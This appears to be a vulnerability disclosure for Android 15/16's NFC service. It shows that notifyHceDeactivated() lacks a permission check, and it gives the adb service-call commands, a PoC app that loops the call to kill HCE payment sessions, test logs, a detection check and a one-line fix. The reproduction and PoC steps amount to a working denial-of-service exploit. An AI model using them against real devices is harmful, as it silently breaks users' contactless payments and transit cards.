# NfcService.notifyHceDeactivated — Zero-Permission NFC Payment Denial of Service

## Vulnerability Details

`INfcAdapter.Stub.notifyHceDeactivated()` in the NFC mainline module has no permission check. Any installed app can call it to force-terminate active HCE payment sessions.

**Source**: `packages/modules/Nfc/src/com/android/nfc/NfcService.java`

```java
@Override
public void notifyHceDeactivated() {
    try {
        mCardEmulationManager.onHostCardEmulationDeactivated(1);
    } catch (Exception ex) {
        Log.e(TAG, "error when notifying HCE deactivated", ex);
    }
    // No permission check — compare with enable(), disable(), dispatch() etc.
    // which all call enforceAdminPermissions()
}
```

The call reaches `HostEmulationManager.onHostEmulationDeactivated()` → `sendDeactivateToActiveServiceLocked()`, which is the same code path triggered when a phone physically leaves an NFC reader. It terminates the active APDU session immediately.

`notifyPollingLoop()` in the same class has the identical issue (zero permission enforcement, transaction code 48).

## Impact

**Attack conditions**:
- Install a malicious app (can be disguised as anything)
- Only needs `android.permission.NFC` — normal permission, auto-granted, no user prompt
- No root, no ADB, no special privileges
- Works from background

**What it does**:
- Continuously calls `notifyHceDeactivated()` (~20 calls/second)
- Every NFC contactless payment fails — Google Pay, bank apps, transit cards
- User sees no error. NFC appears enabled. No notification, no indication of attack.
- Only fix is to uninstall the malicious app

**Who is affected**: All Android 15/16 users with NFC who make contactless payments or use NFC transit.

## Reproduction

### Minimal proof (no app required)

```bash
# Confirm NFC service is accessible:
adb shell service check nfc

# Call notifyHceDeactivated (transaction code 49 on Android 16):
adb shell "service call nfc 49 s16 android.nfc.INfcAdapter"
# Result: Parcel(00000000) ← SUCCESS, no exception

# Compare with enable() (code 8, has permission check):
adb shell "service call nfc 8 s16 android.nfc.INfcAdapter"
# Result: Parcel(ffffffff ...) ← SecurityException as expected

# Verify server-side execution:
adb logcat -d --pid=$(adb shell pidof com.android.nfc) | grep -i deactiv
# Output:
# NfcHostEmulationManager: onHostEmulationDeactivated
# NfcHostEmulationManager: sendDeactivateToActiveServiceLocked: reason: 0
```

### Full PoC app

```bash
cd poc-nfc-hijack
# Build (requires Android SDK with build-tools and platform 35):
# See build instructions in README.md

adb install build/apk/poc-debug.apk
adb shell am start -n com.poc.nfchijack/.MainActivity
# Tap "0. Test Binder Access" — confirms binder acquisition
# Tap "V-452: Kill" — starts deactivation loop
# Monitor: adb logcat -s NfcKillService
# Expected: "[V-452] HCE deactivation count: 100" (no SecurityException)
```

### Payment DoS verification (requires NFC reader)

1. Start the kill loop (PoC app → "V-452: Kill")
2. Open Google Pay, tap phone to NFC terminal
3. Transaction fails
4. Stop kill loop → retry → transaction succeeds

## Fingerprint

**Confirmed vulnerable**:
```
Device: Pixel 10 (frankel)
OS: Android 16 (SDK 36)
Build: google/frankel/frankel:16/CP1A.260405.005/15001963:user/release-keys
Security Patch: 2026-04-05
NFC Module: com.android.nfc versionCode:36
```

**Affected versions**: Android 15 (API 35) and Android 16 (API 36). The method was added with the PollingLoop API in Android 15. Possibly Android 14 (needs check).

**Detection**:
```bash
# Vulnerable if this returns Parcel(00000000) instead of SecurityException:
adb shell "service call nfc 49 s16 android.nfc.INfcAdapter"
```

Note: Transaction code 49 is specific to the current AIDL ordering. On other builds, extract the code from `framework-nfc.jar`:
```bash
adb pull /apex/com.android.nfcservices/javalib/framework-nfc.jar /tmp/
dexdump /tmp/framework-nfc.jar | grep -A5 "TRANSACTION_notifyHceDeactivated"
```

## Fix

```java
@Override
public void notifyHceDeactivated() {
    NfcPermissions.enforceAdminPermissions(mContext);
    // ... existing code
}
```

## Test Evidence (2026-04-30)

```
# App-level: 196 successful calls in 10 seconds, 0 failures
NfcKillService: [V-452] Starting HCE deactivation loop (interval=50ms)
NfcKillService: [V-452] HCE deactivation count: 100
NfcKillService: [V-452] Stopped. Total kills=196 failures=0

# Server-side execution proof:
NfcHostEmulationManager: onHostEmulationDeactivated
NfcHostEmulationManager: sendDeactivateToActiveServiceLocked: reason: 0
```
